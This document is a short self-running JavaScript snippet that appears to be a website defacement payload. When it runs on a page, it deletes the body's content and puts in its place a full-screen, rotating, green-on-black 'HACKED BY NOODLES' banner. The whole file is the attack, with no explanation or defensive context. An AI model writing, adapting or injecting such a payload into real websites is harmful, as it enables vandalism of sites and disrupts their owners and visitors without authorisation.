(() => {
  const config = {
    targetSelector: 'body',
    replacementText: 'HACKED BY NOODLES',
    backgroundColor: '#000',
    textColor: '#0f0',
    fontFamily: 'monospace',
    fontSize: '24px',
    fontWeight: 'bold',
    textAlign: 'center',
    padding: '20px',
    animationDuration: '1s',
    animationName: 'hackerAnimation',
    animationIterationCount: 'infinite'
  };

  const applyDefacement = () => {
    const target = document.querySelector(config.targetSelector);

    if (!target) {
      console.error('Target element not found: ' + config.targetSelector);
      return;
    }

    while (target.firstChild) {
      target.removeChild(target.firstChild);
    }

    const defacementMessage = document.createElement('div');
    defacementMessage.textContent = config.replacementText;

    Object.assign(defacementMessage.style, {
      backgroundColor: config.backgroundColor,
      color: config.textColor,
      fontFamily: config.fontFamily,
      fontSize: config.fontSize,
      fontWeight: config.fontWeight,
      textAlign: config.textAlign,
      padding: config.padding,
      animationName: config.animationName,
      animationDuration: config.animationDuration,
      animationIterationCount: config.animationIterationCount,
      position: 'fixed',
      top: '0',
      left: '0',
      width: '100%',
      height: '100%',
      boxSizing: 'border-box',
      zIndex: '9999',
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'center',
      flexDirection: 'column'
    });

    target.appendChild(defacementMessage);

    const styleSheetId = 'defacement-animation-style';
    if (!document.getElementById(styleSheetId)) {
      const styleSheet = document.createElement("style");
      styleSheet.type = "text/css";
      styleSheet.id = styleSheetId;
      styleSheet.innerText = `
        @keyframes ${config.animationName} {
          0%   { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      `;
      document.head.appendChild(styleSheet);
    }
  };

  const deface = () => {
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', applyDefacement);
    } else {
      applyDefacement();
    }
  };

  deface();
})();